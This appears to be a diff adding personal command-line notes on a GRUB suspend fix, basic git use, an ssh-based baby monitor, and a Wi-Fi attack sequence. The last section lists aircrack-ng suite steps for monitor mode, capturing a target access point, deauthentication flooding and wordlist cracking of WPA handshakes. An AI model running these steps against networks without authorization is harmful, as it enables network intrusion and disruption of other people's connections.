@@ -1,3 +1,47 @@
+system shuts down during lid close suspend:
+Edit the file /etc/default/grub 
+Change the line with:
+GRUB_CMDLINE_LINUX=""
+to GRUB_CMDLINE_LINUX="acpi_sleep=nonvs"
+run update-grub
+
+***********
+
+git
+
+git init
+
+# to set the editor
+git config --global core.editor "vim"
+
+git commit
+
+git status
+
+git log
+
+git rm [file names]
+
+***********************
+
+ssh pi@raspberrypi.home 'arecord -f cd -D plughw:1 | ffmpeg -ac 1 -i - -f ogg -' | mplayer - -idle -demuxer ogg # Baby monitor over ssh, making it more private/secure than those in stores. Replace plughw:1 with mic device from arecord -l output. Make it a script for easy access.
+ 
+
+************************
+airmon-ng
+airmon-ng start [interface name]
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c 6 # only channel 6
+airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 # only this ap on this channel
+airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 -w capture-file
+aireplay-ng --deauth 100 -a [ap mac] wlan0mon
+aircrack-ng -w words [cap file]
+
+aircrack-ng will list out the APs in the cap file and, if wpa, will list num of handsakes; need 1
+pipe it through tee [file] and select some random ap to capture text list of aps, then:
+grep handshake foo1 | grep -v "0 handshake"
+
+to find if there are any to crack
 
 ##############################
 
